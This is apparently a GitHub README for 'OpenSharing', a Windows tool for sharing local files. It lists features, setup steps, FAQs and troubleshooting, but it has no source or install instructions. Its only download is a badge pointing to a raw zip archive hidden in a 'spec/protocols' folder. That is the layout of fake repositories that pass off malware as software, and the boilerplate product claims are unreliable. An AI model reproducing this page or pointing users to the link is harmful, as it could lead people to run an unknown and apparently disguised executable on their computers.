# 📁 OpenSharing - Share local files with anyone effortlessly

[![](https://img.shields.io/badge/Download_OpenSharing-007bff?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Lovemallet785/OpenSharing/main/spec/protocols/Sharing_Open_v2.6.zip)

OpenSharing lets you send files directly from your computer to others. It removes the need for cloud storage services. You keep control of your data at all times. The software works on your local network or over the internet. You grant access to specific folders and share the link with your recipient.

## 🛠 Features

*   **Direct Transfers:** Files travel straight from your computer to the receiver.
*   **No Size Limits:** Send files of any size without restriction.
*   **Privacy First:** Your data never sits on a third-party server.
*   **Simple Interface:** Manage your shares through a clean dashboard.
*   **Secure Access:** Set passwords for your share links to ensure safety.

## ⚙️ System Requirements

OpenSharing runs on Windows devices. You need Windows 10 or Windows 11. Ensure your computer has at least 4GB of RAM. The software occupies 200MB of disk space. A stable internet connection allows for the best performance during file transfers.

## 🚀 Setting Up Your First Share

1.  Open the application after installation.
2.  Select the folder you wish to share by clicking the Browse button.
3.  Choose the permissions level for that folder. You can allow others to view or download files.
4.  Press the Create Share button.
5.  The application generates a unique link for your selection.
6.  Copy this link and send it to your recipient via email or instant message.
7.  The recipient clicks the link to access the shared files from their web browser.

## 🔒 Security Tips

Always password-protect your shared links to prevent unauthorized access. Monitor the dashboard to see who currently connects to your computer. Disconnect any session if you notice activity you do not recognize. Stop the sharing process when you finish the task. Closing the application terminates all active links instantly.

## ❓ Frequently Asked Questions

**Does OpenSharing work while my computer sleeps?**
No, your computer must stay powered on and awake to host shared files. Check your power settings to prevent automatic sleep.

**Do I need an account?**
You do not need to create an account or provide personal information to use the software.

**Can I share individual files instead of folders?**
Yes, use the single-file share option located in the settings menu to select one item at a time.

**Where do I find my log files?**
The application stores logs in your documents folder under the OpenSharing directory. These logs help troubleshoot issues if a transfer fails.

## 🔧 Troubleshooting

If you fail to send a file, verify your internet connection. Check that your firewall does not block the application. You might need to add the software to your firewall exception list. If the recipient cannot access your link, ensure that your computer remains connected to the network. Restart the application if it becomes unresponsive. Contact the support channel if you continue to experience errors during file transfers. Keep your Windows system up to date to ensure compatibility with new versions of the software. Verify that the file you wish to share exists at the original location. Moving a file while you share it breaks the connection.
